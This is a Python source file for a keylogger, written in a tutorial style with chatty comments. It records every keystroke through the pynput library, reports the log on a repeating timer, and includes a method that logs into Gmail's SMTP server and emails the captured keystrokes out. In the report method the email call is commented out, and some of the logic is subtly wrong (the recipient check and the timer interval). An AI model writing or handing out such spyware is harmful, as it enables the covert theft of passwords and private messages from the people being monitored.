#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib
import sys

class Keylogger:

    # This is the Constructor for the class :)
    # In python we declare it using the name 'init' while the '__' mean it's a private method :)

    def __init__(self, time_interval = 300):
        self.log = "Keylogger Started :)\t" # Instantiating the 'log' variable :)
        self.interval = time_interval

        # print("Inside the Constructor of Keylogger class ")


    # First Argument in a Method in a python class is always 'self' as it specifies that the method runs on its own object :)
    #
    # That 'self' references to the instance of the class so we can access other data members or function within that METHOD
    # from that class by accessing them through 'self'


    def send_mail(self, sender_email, sender_password, message, receiver_email="self"):
        server = smtplib.SMTP("smtp.gmail.com", 587)  # Creates SMTP server instance :)
        # Google allows users to use their server which runs on port 587 :)

        server.starttls()  # Initiates TLS connection to the server :)

        server.login(sender_email, sender_password)  # Login in with the email and pass on the Server :)

        server.sendmail(from_addr=sender_email, to_addrs=receiver_email if receiver_email is "self" else sender_email,
                        msg=message)  # Sends A Mail containing this.message :)

        server.quit()  # Quits Server :)


    def process_key_press(self, key):
        # Since we are in class (and not in independent rogue functions) and have defined 'log' as a instance variable,
        # so global keyword is not required to access it from within the class :)
        #
        # global log


        try:
            self.log += str(key.char)
        except AttributeError:

            if key == key.space:
                self.log += " "
            elif key == key.shift or key == key.shift_r:
                pass
            else:
                self.log += " " + str(key) + " "

        # print(self.log)


    def report(self):
        # Since we are in class and have defined 'log' as a instance variable,
        # so global keyword is not required to access it from within the class :)
        #
        # global log

        print(self.log)
        # self.send_mail(self.email, self.password, "\n\n" + self.log)
        # Used two '\n' before log so that 'log' is not sent as a subject of the email,
        # but rather as the main message :)

        self.log = ""

        timer = threading.Timer(interval=50, function=self.report)  # Time Is In Seconds '300s' (by default that is) :)

        timer.start()  # To start The Thread :)


    def start_logging(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:  # 'with' is used here since we are working with unmanaged data stream output :)
            self.report()  # First Report says 'Keylogger Started' and then it continues :)
            keyboard_listener.join()  # To Start The Keylogger





